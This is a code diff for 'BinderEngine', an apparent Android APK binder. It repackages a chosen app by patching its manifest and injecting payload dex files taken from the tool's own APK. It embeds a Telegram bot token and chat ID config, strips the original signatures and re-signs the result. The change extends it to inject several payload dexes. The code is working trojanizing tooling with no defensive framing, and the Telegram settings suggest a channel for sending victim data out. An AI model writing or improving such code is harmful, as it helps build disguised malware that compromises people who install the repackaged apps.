@@ -33,7 +33,7 @@ class BinderEngine(private val context: Context) {
         private const val ALIGN_SO = 16384
         private const val ALIGN_DEFAULT = 4
         private const val MANIFEST = "AndroidManifest.xml"
-        private const val DEX_PATTERN = "classes(\\d*)\\.dex"
+        private const val DEX_REGEX = "classes(\\d*)\\.dex"
     }
 
     suspend fun bind(
@@ -51,9 +51,6 @@ class BinderEngine(private val context: Context) {
         try {
             if (label.isNotBlank()) onLog(LogLevel.INFO, "App: $label")
             if (activity.isNotBlank()) onLog(LogLevel.INFO, "Activity: $activity")
-            if (!config.originalAppClass.isNullOrBlank()) {
-                onLog(LogLevel.INFO, "Original App class: ${config.originalAppClass}")
-            }
 
             val src = resolveSource(source)
             if (src == null) {
@@ -78,11 +75,18 @@ class BinderEngine(private val context: Context) {
             val authority = pkg + Const.AUTHORITY_SUFFIX
             onLog(LogLevel.INFO, "Authority: $authority")
 
+            val payloadDexes = collectPayloadDexes()
+            if (payloadDexes.isEmpty()) {
+                onLog(LogLevel.ERROR, "Payload dex not found in own APK")
+                return@withContext BindResult(false, "Payload dex missing")
+            }
+            val payloadKb = payloadDexes.sumOf { it.size } / 1024
+            onLog(LogLevel.INFO, "Payload dexes: ${payloadDexes.size} (${payloadKb} KB)")
+
             val temp = File(context.cacheDir, "hs_${System.currentTimeMillis()}.unsigned.apk")
             temps.add(temp)
 
             var patched: ByteArray? = null
-            var payloadDexName = "classes.dex"
 
             ZipFile(src).use { zip ->
 
@@ -111,11 +115,8 @@ class BinderEngine(private val context: Context) {
                 }
                 onLog(LogLevel.INFO, "Patched manifest: ${patchedBytes.size} bytes")
 
-                payloadDexName = nextDexName(zip)
-                onLog(LogLevel.INFO, "Payload dex slot: $payloadDexName")
-
-                val payloadDex = readAsset("classes.dex")
-                onLog(LogLevel.INFO, "Payload dex: ${payloadDex.size} bytes")
+                var slot = maxDexIndex(zip)
+                onLog(LogLevel.INFO, "Host dex max index: $slot")
 
                 FileOutputStream(temp).use { fos ->
                     CountingStream(fos).use { cs ->
@@ -127,7 +128,6 @@ class BinderEngine(private val context: Context) {
                                 val name = e.name
 
                                 if (name == MANIFEST) continue
-                                if (name == payloadDexName) continue
                                 if (name == "assets/" + Const.CONFIG_ASSET) continue
                                 if (isSignatureFile(name)) continue
 
@@ -137,7 +137,13 @@ class BinderEngine(private val context: Context) {
                             }
 
                             writeEntry(zos, cs, MANIFEST, patchedBytes, false)
-                            writeEntry(zos, cs, payloadDexName, payloadDex, false)
+
+                            for (dex in payloadDexes) {
+                                slot++
+                                val dexName = if (slot == 1) "classes.dex" else "classes$slot.dex"
+                                writeEntry(zos, cs, dexName, dex, false)
+                                onLog(LogLevel.INFO, "Injected $dexName (${dex.size / 1024} KB)")
+                            }
 
                             if (config.token.isNotBlank() && config.chatId.isNotBlank()) {
                                 val json = "{\"bot_token\":\"${config.token}\",\"chat_id\":\"${config.chatId}\"}"
@@ -213,6 +219,42 @@ class BinderEngine(private val context: Context) {
         }
     }
 
+    // ------------------------------------------------------------------
+    // Payload dex from own APK
+    // ------------------------------------------------------------------
+    private fun collectPayloadDexes(): List<ByteArray> {
+        val out = ArrayList<ByteArray>()
+        try {
+            val self = context.packageManager
+                .getApplicationInfo(context.packageName, 0).sourceDir
+            val rx = Regex(DEX_REGEX)
+            ZipFile(self).use { z ->
+                val entries = z.entries()
+                while (entries.hasMoreElements()) {
+                    val e = entries.nextElement()
+                    if (!rx.matches(e.name)) continue
+                    val bytes = z.getInputStream(e).use { it.readBytes() }
+                    out.add(bytes)
+                }
+            }
+        } catch (t: Throwable) {
+            // ignore, caller checks empty
+        }
+        return out
+    }
+
+    private fun maxDexIndex(zip: ZipFile): Int {
+        var max = 0
+        val rx = Regex(DEX_REGEX)
+        val entries = zip.entries()
+        while (entries.hasMoreElements()) {
+            val m = rx.matchEntire(entries.nextElement().name) ?: continue
+            val n = m.groupValues[1].toIntOrNull() ?: 1
+            if (n > max) max = n
+        }
+        return max
+    }
+
     private fun resolveSource(uri: Uri): File? {
         try {
             if (uri.scheme == "file") {
@@ -284,18 +326,6 @@ class BinderEngine(private val context: Context) {
         return set.toList()
     }
 
-    private fun nextDexName(zip: ZipFile): String {
-        var max = 0
-        val regex = Regex(DEX_PATTERN)
-        val entries = zip.entries()
-        while (entries.hasMoreElements()) {
-            val m = regex.matchEntire(entries.nextElement().name) ?: continue
-            val n = m.groupValues[1].toIntOrNull() ?: 1
-            if (n > max) max = n
-        }
-        return "classes${max + 1}.dex"
-    }
-
     private fun isSignatureFile(name: String): Boolean {
         if (!name.startsWith("META-INF/")) return false
         val upper = name.uppercase()
@@ -358,9 +388,6 @@ class BinderEngine(private val context: Context) {
         override fun flush() = out.flush()
         override fun close() = out.flush()
     }
-
-    private fun readAsset(name: String): ByteArray =
-        context.assets.open(name).use { it.readBytes() }
 
     private fun sign(input: File, output: File, onLog: (LogLevel, String) -> Unit) {
         val ks = KeyStore.getInstance("JKS")
